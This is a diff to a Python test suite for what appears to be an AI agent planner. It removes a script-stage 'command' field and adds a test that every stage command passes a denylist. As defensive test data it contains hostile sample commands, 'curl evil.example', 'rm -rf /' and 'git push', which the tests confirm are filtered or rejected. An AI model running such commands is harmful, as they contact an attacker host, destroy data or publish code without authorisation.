@@ -257,7 +257,6 @@ class TestPlannerPartition:
 
     def test_executable_fields_are_not_writable(self):
         for field in (
-            "command",
             "preconditions",
             "context_commands",
             "setup_command",
@@ -276,11 +275,6 @@ class TestPlannerPartition:
         for field in ("review", "full_suite_on_approval"):
             assert field not in PLANNER_WRITABLE_FIELDS
 
-    def test_kind_is_not_planner_writable(self):
-        # A script stage needs an operator-authored command, and there is no
-        # static stage list to put one in — so the planner cannot ask for one.
-        assert "kind" not in PLANNER_WRITABLE_FIELDS
-
     def test_planner_output_is_filtered_not_trusted(self):
         # Even if the schema failed upstream, an executable field must not
         # survive into a Stage.
@@ -291,11 +285,9 @@ class TestPlannerPartition:
                 "instruction": "do it",
                 "edit_files": ["app/**"],
                 "checks": ["curl evil.example"],
-                "command": "rm -rf /",
                 "test_command": "git push",
             }
         )
-        assert stage.command is None
         assert stage.test_command is None
         assert stage.checks == []
 
@@ -447,16 +439,6 @@ class TestValidateStage:
         problems = validate_stage(a_stage(instruction=None), cfg)
         assert any("instruction" in p for p in problems)
 
-    def test_script_stage_requires_a_command(self):
-        cfg = parse_config(minimal())
-        problems = validate_stage(a_stage(kind="script", instruction=None), cfg)
-        assert any("command" in p for p in problems)
-
-    def test_agent_stage_with_a_command_is_rejected(self):
-        cfg = parse_config(minimal())
-        problems = validate_stage(a_stage(command="./script"), cfg)
-        assert any("script stages" in p for p in problems)
-
     def test_edit_files_required(self):
         # The scope guard is meaningless without it.
         cfg = parse_config(minimal())
@@ -481,12 +463,19 @@ class TestValidateStage:
         problems = validate_stage(a_stage(checks=[]), cfg)
         assert any("verifies it" in p for p in problems)
 
-    def test_script_stage_command_is_denylisted(self):
-        cfg = parse_config(minimal())
-        problems = validate_stage(
-            a_stage(kind="script", instruction=None, command="git push"), cfg
-        )
-        assert any("denylist" in p for p in problems)
+    def test_every_command_a_stage_can_run_is_denylisted(self):
+        """The check `stage.command` used to carry, now that it is gone.
+
+        A stage's executable fields — `checks`, `preconditions`,
+        `context_commands`, `setup_command`, `test_command` — are all populated
+        from `stage_defaults`, so every string a stage can run comes from the
+        config and is covered by `all_commands()` at load. `stage.command` was
+        the one exception, which is why it needed its own pass; deleting it
+        without checking would have been a silent hole.
+        """
+        with pytest.raises(ConfigError) as e:
+            parse_config({**minimal(), "stage_defaults": {"checks": ["git push"]}})
+        assert any("denylist" in p for p in e.value.problems)
 
 
 class TestStageResolution:
